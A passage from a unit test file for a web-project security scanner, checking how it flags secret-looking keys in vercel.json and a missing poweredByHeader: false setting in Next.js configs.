    it("does NOT flag short values (under 10 chars)", () => {
      const vercelConfig = JSON.stringify({
        env: {
          API_SECRET_KEY: "short",
        },
      });
      const files = makeFiles({ "vercel.json": vercelConfig });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 53);
      expect(finding).toBeUndefined();
    });

    it("does NOT flag non-secret-looking keys even with long values", () => {
      const vercelConfig = JSON.stringify({
        env: {
          NEXT_PUBLIC_APP_URL: "https://app.example.com/some/long/path/here",
        },
      });
      const files = makeFiles({ "vercel.json": vercelConfig });
      const findings = analyzeConfig(files);
      const finding = findings.find((f) => f.vulnerability_id === 53);
      expect(finding).toBeUndefined();
    });

    it("does not crash on invalid JSON in vercel.json", () => {
      const files = makeFiles({ "vercel.json": "not valid json" });
      expect(() => analyzeConfig(files)).not.toThrow();
      const findings = analyzeConfig(files);
      expect(Array.isArray(findings)).toBe(true);
    });

    it("flags multiple secret keys in the same vercel.json", () => {
      const vercelConfig = JSON.stringify({
        env: {
          API_SECRET_KEY: "firstsecretvalue12345678901234",
          PRIVATE_TOKEN: "secondsecretvalue12345678901234",
        },
      });
      const files = makeFiles({ "vercel.json": vercelConfig });
      const findings = analyzeConfig(files);
      const secretFindings = findings.filter((f) => f.vulnerability_id === 53);
      expect(secretFindings).toHaveLength(2);
    });
  });

  // -------------------------------------------------------------------------
  // next.config poweredByHeader
  // -------------------------------------------------------------------------

  describe("next.config poweredByHeader analysis", () => {
    it("flags next.config that does not mention poweredByHeader at all", () => {
      const config = `
const nextConfig = {
  reactStrictMode: true,
};
module.exports = nextConfig;`;
      const files = makeFiles({ "next.config.js": config });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 4 && f.title.includes("X-Powered-By")
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("low");
      expect(finding!.category).toBe("react-nextjs");
      expect(finding!.owasp_ref).toBe("A05:2021");
    });

    it("flags next.config where poweredByHeader is not set to false", () => {
      const config = `
const nextConfig = {
  poweredByHeader: true,
};
module.exports = nextConfig;`;
      const files = makeFiles({ "next.config.js": config });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 4 && f.title.includes("X-Powered-By")
      );
      expect(finding).toBeDefined();
    });

    it("does NOT flag next.config with poweredByHeader: false", () => {
      const config = `
const nextConfig = {
  poweredByHeader: false,
};
module.exports = nextConfig;`;
      const files = makeFiles({ "next.config.js": config });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 4 && f.title.includes("X-Powered-By")
      );
      expect(finding).toBeUndefined();
    });

    it("does NOT flag next.config.ts with poweredByHeader: false", () => {
      const config = `
import type { NextConfig } from "next";
const nextConfig: NextConfig = {
  poweredByHeader: false,
};
export default nextConfig;`;
      const files = makeFiles({ "next.config.ts": config });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 4 && f.title.includes("X-Powered-By")
      );
      expect(finding).toBeUndefined();
    });

    it("does NOT flag next.config.mjs with poweredByHeader: false", () => {
      const config = `
const nextConfig = {
  poweredByHeader: false,
};
export default nextConfig;`;
      const files = makeFiles({ "next.config.mjs": config });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 4 && f.title.includes("X-Powered-By")
      );
      expect(finding).toBeUndefined();
    });

    it("includes a fix_description for the poweredByHeader finding", () => {
      const config = `
const nextConfig = {};
module.exports = nextConfig;`;
      const files = makeFiles({ "next.config.js": config });
      const findings = analyzeConfig(files);
      const finding = findings.find(
        (f) => f.vulnerability_id === 4 && f.title.includes("X-Powered-By")
      );
      expect(finding!.fix_description).toBeDefined();
      expect(finding!.fix_description).toContain("poweredByHeader");
    });
  });
});
